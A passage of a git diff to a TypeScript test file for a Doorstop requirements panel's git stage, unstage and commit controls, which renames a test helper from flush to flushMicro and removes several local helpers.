     // A context-less menu toggle still opens; inserting with context cleared
     // is a no-op (the element guards `context === undefined`).
     (body as DoorstopPanelBodyElement).context = undefined;
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     root.querySelector<HTMLElement>(".doorstop-explain")?.click();
     expect(controller.selectedUid).toBe("REQ0002");
   });
@@ -2647,10 +2459,10 @@ async function mountGitBody(
   const mounted = await mountBody(job, { backend, provider: opendoorProvider });
   mounted.controller.hostConnected();
   bindBody(mounted.body, mounted.controller, mounted.context);
-  await flush(mounted.body);
+  await flushMicro(mounted.body);
   mounted.body.requestUpdate();
   bindBody(mounted.body, mounted.controller, mounted.context);
-  await flush(mounted.body);
+  await flushMicro(mounted.body);
   return { ...mounted, backend };
 }
 
@@ -2686,7 +2498,7 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
     // JOINS in-flight fetches, so this is one extra round-trip, exactly).
     const before = gitStatusCalls(backend);
     strip?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(gitStatusCalls(backend)).toBe(before + 1);
   });
 
@@ -2714,17 +2526,17 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
     expect(stage?.disabled).toBe(false);
 
     body.runInProgress = "Doorstop: validate";
-    await flush(body);
+    await flushMicro(body);
     expect(root?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.disabled).toBe(true);
     expect(root?.querySelector<HTMLButtonElement>(".doorstop-git-commit-button")?.disabled).toBe(true);
     expect(root?.querySelector<HTMLInputElement>(".doorstop-git-commit-input")?.disabled).toBe(true);
     body.runInProgress = undefined;
-    await flush(body);
+    await flushMicro(body);
 
     // An empty index disables Stage all (an empty stage request is a
     // contradiction the browser never emits — the request parser rejects it).
     body.result = makeResult([], [], [], new Set());
-    await flush(body);
+    await flushMicro(body);
     expect(root?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.disabled).toBe(true);
   });
 
@@ -2735,7 +2547,7 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
     const { body, controller } = await mountGitBody(backend);
     const before = backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_STAGE_OPERATION).length;
     body.shadowRoot?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_STAGE_OPERATION)).toHaveLength(
       before + 1,
     );
@@ -2759,7 +2571,7 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
     // goes out (the browser must never send an empty commit message).
     const commitsBefore = backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION).length;
     input?.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, composed: true }));
-    await flush(body);
+    await flushMicro(body);
     expect(root?.querySelector("[role='alert']")?.textContent).toContain("Enter a commit message");
     expect(
       backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION),
@@ -2782,12 +2594,12 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
 
     input.value = "  Land the strip  ";
     input.dispatchEvent(new Event("input", { bubbles: true, composed: true }));
-    await flush(body);
+    await flushMicro(body);
     expect(commit?.disabled).toBe(false);
 
     const commitsBefore = backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION).length;
     commit?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(
       backend.mock.calls.filter(([operation]) => operation === DOORSTOP_GIT_COMMIT_OPERATION),
     ).toHaveLength(commitsBefore + 1);
@@ -2807,11 +2619,11 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
 
     // Produce an inline error first (Enter on an empty input).
     input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, composed: true }));
-    await flush(body);
+    await flushMicro(body);
     expect(root?.querySelector("[role='alert']")).not.toBeNull();
 
     input.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, composed: true }));
-    await flush(body);
+    await flushMicro(body);
     expect(input.value).toBe("");
     expect(root?.querySelector("[role='alert']")).toBeNull();
   });
@@ -2821,9 +2633,9 @@ describe("DoorstopPanelBodyElement (git strip + stage + commit, plan-add-git-act
     const { body } = await mountGitBody(backend);
     const before = gitStatusCalls(backend);
     body.shadowRoot?.querySelector<HTMLButtonElement>(".doorstop-git-stage")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, (body as DoorstopPanelBodyElement).controller as DoorstopWorkspaceController, body.context as WorkspacePanelContext);
-    await flush(body);
+    await flushMicro(body);
     // The run's success path invalidated (clearing the cached view), and the
     // element's next render re-fetched the strip through the orphan guard.
     expect(gitStatusCalls(backend)).toBeGreaterThan(before);
@@ -2852,7 +2664,7 @@ async function selectItemRow(
 ): Promise<void> {
   body.shadowRoot?.querySelector<HTMLElement>(`.doorstop-item-row[data-uid="${uid}"]`)?.click();
   bindBody(body, controller, context);
-  await flush(body);
+  await flushMicro(body);
 }
 
 describe("DoorstopPanelBodyElement (per-item git staging: chips + row add + palette Stage)", () => {
@@ -2918,7 +2730,7 @@ describe("DoorstopPanelBodyElement (per-item git staging: chips + row add + pale
     body.shadowRoot
       ?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"] .doorstop-item-add')
       ?.click();
-    await flush(body);
+    await flushMicro(body);
 
     expect(backend).toHaveBeenCalledWith(DOORSTOP_GIT_STAGE_OPERATION, { paths: ["reqs/REQ0002.yml"] });
     expect(controller.lastRun).toMatchObject({ op: "git-stage", status: "ok", title: "Git: stage REQ0002" });
@@ -2998,16 +2810,16 @@ describe("DoorstopPanelBodyElement (per-item git staging: chips + row add + pale
     // AND removes the row-level add affordance (the same gate).
     await selectItemRow(body, controller, context, "REQ0002");
     body.runInProgress = "Doorstop: validate";
-    await flush(body);
+    await flushMicro(body);
     expect(stage()?.disabled).toBe(true);
     expect(
       body.shadowRoot?.querySelector('.doorstop-item-row[data-uid="REQ0002"] .doorstop-item-add'),
     ).toBeNull();
     body.runInProgress = undefined;
-    await flush(body);
+    await flushMicro(body);
 
     stage()?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(backend).toHaveBeenCalledWith(DOORSTOP_GIT_STAGE_OPERATION, { paths: ["reqs/REQ0002.yml"] });
     expect(controller.lastRun).toMatchObject({ op: "git-stage", status: "ok", title: "Git: stage REQ0002" });
   });
@@ -3080,13 +2892,13 @@ describe("DoorstopPanelBodyElement (per-item git staging: chips + row add + pale
     body.shadowRoot
       ?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"] .doorstop-item-add')
       ?.click();
-    await flush(body);
+    await flushMicro(body);
     // The success invalidated the cached view; mirroring the cleared view
     // lets the element's orphan guard refetch the updated status.
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     expect(chips()).toContain("staged");
     expect(chips()).not.toContain("changed");
@@ -3148,10 +2960,10 @@ describe("DoorstopPanelBodyElement (per-item git unstaging: row minus + palette 
     expect(minus()).not.toBeNull();
 
     body.runInProgress = "Doorstop: validate";
-    await flush(body);
+    await flushMicro(body);
     expect(minus()).toBeNull();
     body.runInProgress = undefined;
-    await flush(body);
+    await flushMicro(body);
 
     // Truncation suppresses EVERY per-item git affordance, minus included
     // (an unstage against unreported paths would act on stale path data).
@@ -3206,15 +3018,15 @@ describe("DoorstopPanelBodyElement (per-item git unstaging: row minus + palette 
 
     // An in-flight run disables both (the shared runInProgress gate).
     body.runInProgress = "Doorstop: validate";
-    await flush(body);
+    await flushMicro(body);
     expect(stage()?.disabled).toBe(true);
     expect(unstage()?.disabled).toBe(true);
     body.runInProgress = undefined;
-    await flush(body);
+    await flushMicro(body);
 
     // Clicking the palette Unstage sends the per-item request and title.
     unstage()?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(backend).toHaveBeenCalledWith(DOORSTOP_GIT_UNSTAGE_OPERATION, {
       paths: ["tests/TST001.yml"],
     });
@@ -3239,7 +3051,7 @@ describe("DoorstopPanelBodyElement (per-item git unstaging: row minus + palette 
     body.shadowRoot
       ?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"] .doorstop-item-add')
       ?.click();
-    await flush(body);
+    await flushMicro(body);
 
     expect(backend).toHaveBeenCalledWith(DOORSTOP_GIT_UNSTAGE_OPERATION, {
       paths: ["reqs/REQ0002.yml"],
@@ -3281,13 +3093,13 @@ describe("DoorstopPanelBodyElement (per-item git unstaging: row minus + palette 
     expect(span()?.getAttribute("title")).toBe("git reset reqs/REQ0002.yml");
 
     span()?.click();
-    await flush(body);
+    await flushMicro(body);
     // The success invalidated the cached view; mirroring the cleared view
     // lets the element's orphan guard refetch the updated status.
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     expect(unstaged).toBe(true);
     expect(span()?.getAttribute("title")).toBe("git add reqs/REQ0002.yml");
@@ -3326,60 +3138,6 @@ function bindBody(
   body.gitStatusInFlight = controller.gitStatusInFlight;
 }
 
-async function flush(body: DoorstopPanelBodyElement): Promise<void> {
-  await body.updateComplete;
-  await settle();
-}
-
-/** Build one panel context wrapping a fake files adapter plus spies for the
- *  surfaces the element reads at click time: `requestRender` (the
- *  controller's render path), `prompt.insertText`, a `focusPrompt` widening,
- *  `terminal.runCommand`, and (Phase D) the optional `backend.request`
- *  surface plus the workspace `provider` metadata that gates the backend
- *  path. Without `hook.backend` the context carries no `backend` property
- *  (exactly the unpaired real shape), so the terminal path is exercised by
- *  default. */
-function panelContext(hook: {
-  insertText?: Mock;
-  focusPrompt?: Mock;
-  runCommand?: Mock;
-  backend?: Mock;
-  provider?: Workspace["provider"];
-} = {}): {
-  context: WorkspacePanelContext;
-  requestRender: Mock;
-  insertText: Mock;
-  focusPrompt: Mock;
-  runCommand: Mock;
-  backend: Mock | undefined;
-} {
-  const requestRender = vi.fn();
-  const insertText = hook.insertText ?? vi.fn();
-  const focusPrompt = hook.focusPrompt ?? vi.fn();
-  const runCommand = hook.runCommand ?? vi.fn(() => Promise.resolve(completedHandle()));
-  const backend = hook.backend;
-  const workspace = hook.provider === undefined ? doorstopWorkspace : { ...doorstopWorkspace, provider: hook.provider };
-  const files: FakeWorkspaceFiles = createFakeFiles();
-  const context: WorkspacePanelContext & { focusPrompt: Mock } = {
-    machine: { id: "local", name: "local", kind: "local" },
-    workspace,
-    state: {
-      selectedWorkspace: workspace,
-      workspaceTool: "opendoor:workspace.doorstop",
-      mainView: "opendoor:workspace.doorstop",
-    },
-    files: files.files,
-    host: { requestRender },
-    prompt: { insertText, getText: () => "", getSelection: () => null },
-    terminal: { open: () => undefined, runCommand },
-    // The optional `backend` field is only present when the hook supplied
-    // one (exactOptionalPropertyTypes forbids an explicit undefined write).
-    ...(backend === undefined ? {} : { backend: { request: backend } }),
-    focusPrompt,
-  };
-  return { context, requestRender, insertText, focusPrompt, runCommand, backend };
-}
-
 /** A canned `DoorstopRunResponse` for the backend spies; callers override
  *  only the fields their scenario cares about. */
 function makeRunResponse(overrides: Partial<DoorstopRunResponse> = {}): DoorstopRunResponse {
@@ -3413,19 +3171,4 @@ function makeRun(overrides: Partial<TerminalCommandRun> = {}): TerminalCommandRu
     metadata: { "opendoor.op": "validate" },
     ...overrides,
   };
-}
-
-/** A resolved terminal run handle the default runCommand mock returns. */
-function completedHandle(): TerminalCommandRunHandle {
-  const run = makeRun({ status: "succeeded", completedAt: new Date().toISOString() });
-  return { run, completed: Promise.resolve(run) };
-}
-
-/** How many microtask turns a bare `await settle()` waits for a resolved
- *  promise chain to flush. A magic number, but named and shared so every
- *  test's timing assumption is uniform. */
-const SETTLE_TICKS = 10;
-
-async function settle(): Promise<void> {
-  for (let index = 0; index < SETTLE_TICKS; index += 1) await Promise.resolve();
 }
